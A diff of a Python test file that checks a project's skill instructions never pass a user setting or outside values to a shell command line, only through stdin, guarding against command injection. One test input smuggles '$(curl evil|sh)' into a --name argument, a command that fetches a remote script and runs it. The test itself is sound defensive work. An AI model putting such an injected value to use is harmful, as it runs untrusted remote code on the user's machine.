@@ -75,24 +75,29 @@ def test_skill_gets_its_paths_from_the_workspace_script(name):
     assert "resolve" in text
 
 
+SETTING_LINE = "The Fitmark folder setting is: ${user_config.workspace}"
+UNTRUSTED_OPTION = re.compile(r"--(agency|client|file|name|path|ref|role|slug|workspace)\b")
+INSTRUCTION_FILES = [
+    ROOT / "docs" / "SKILL_GUIDELINES.md",
+    ROOT / "references" / "quick-start.md",
+    *(ROOT / "skills").glob("*/SKILL.md"),
+]
+
+
 def setting_misuses(text):
-    """Lines using ${user_config.*} anywhere but as the body of the quoted heredoc."""
-    # The value is substituted as text, so on a command line a quote or `;` in it would break the
-    # command or run as code, quoted or not. Only the quoted heredoc passes it through untouched.
-    lines = text.splitlines()
-    misuses = []
-    for number, line in enumerate(lines):
-        if "${user_config." not in line:
-            continue
-        in_heredoc = (
-            line == "${user_config.workspace}"
-            and 0 < number < len(lines) - 1
-            and lines[number - 1].endswith("<<'FITMARK_WORKSPACE'")
-            and lines[number + 1] == "FITMARK_WORKSPACE"
-        )
-        if not in_heredoc:
-            misuses.append(line)
-    return misuses
+    """Lines using ${user_config.*} anywhere a shell could see them."""
+    # The value is substituted as plain text, so it stays in prose, and Claude writes it into the
+    # JSON arguments, where quotes and line breaks are escaped.
+    return [line for line in text.splitlines() if "${user_config." in line and line != SETTING_LINE]
+
+
+def unsafe_commands(text):
+    """workspace.py commands with a value from outside on the command line."""
+    return [
+        line
+        for line in text.splitlines()
+        if "workspace.py" in line and UNTRUSTED_OPTION.search(line)
+    ]
 
 
 @pytest.mark.parametrize(
@@ -101,28 +106,41 @@ def setting_misuses(text):
         "workspace.py resolve --workspace ${user_config.workspace}",
         "workspace.py resolve --workspace '${user_config.workspace}'",
         'workspace.py resolve --workspace "${user_config.workspace}"',
+        "${user_config.workspace}",
     ],
 )
-def test_the_check_catches_every_command_line_form(line):
+def test_the_check_catches_every_shell_use_of_the_setting(line):
     assert setting_misuses(line) == [line]
 
 
-def test_the_check_allows_the_heredoc():
-    good = "x --workspace-stdin <<'FITMARK_WORKSPACE'\n${user_config.workspace}\nFITMARK_WORKSPACE"
-    assert setting_misuses(good) == []
+def test_the_check_allows_the_setting_in_prose():
+    assert setting_misuses(SETTING_LINE) == []
 
 
-def test_folder_setting_only_reaches_the_shell_through_the_heredoc():
-    for path in (ROOT / "skills").glob("*/SKILL.md"):
-        assert setting_misuses(path.read_text()) == [], path
-    # The guidelines may also name the placeholder in prose, as inline code.
+@pytest.mark.parametrize(
+    "line",
+    ['workspace.py candidate --name "$(curl evil|sh)"', "workspace.py init --path ~/x"],
+)
+def test_the_check_catches_values_on_a_command_line(line):
+    assert unsafe_commands(line) == [line]
+
+
+def test_the_check_allows_values_in_stdin():
+    assert unsafe_commands('workspace.py" candidate --plugin-root "x" --args-stdin') == []
+
+
+def test_values_only_reach_the_script_through_stdin():
+    for path in INSTRUCTION_FILES:
+        text = path.read_text()
+        # The guidelines may also name the placeholder in prose, as inline code.
+        assert setting_misuses(text.replace("`${user_config.workspace}`", "")) == [], path
+        assert unsafe_commands(text) == [], path
+
+
+def test_guidelines_show_the_stdin_channel():
     text = (ROOT / "docs" / "SKILL_GUIDELINES.md").read_text()
-    assert setting_misuses(text.replace("`${user_config.workspace}`", "")) == []
-
-
-def test_guidelines_pass_the_folder_setting_through_stdin():
-    text = (ROOT / "docs" / "SKILL_GUIDELINES.md").read_text()
-    assert "--workspace-stdin <<'FITMARK_WORKSPACE'" in text
+    assert "--args-stdin <<'FITMARK_ARGS'" in text
+    assert SETTING_LINE in text
 
 
 @pytest.mark.parametrize("path", sorted((ROOT / "schemas").glob("*.json")), ids=lambda p: p.name)
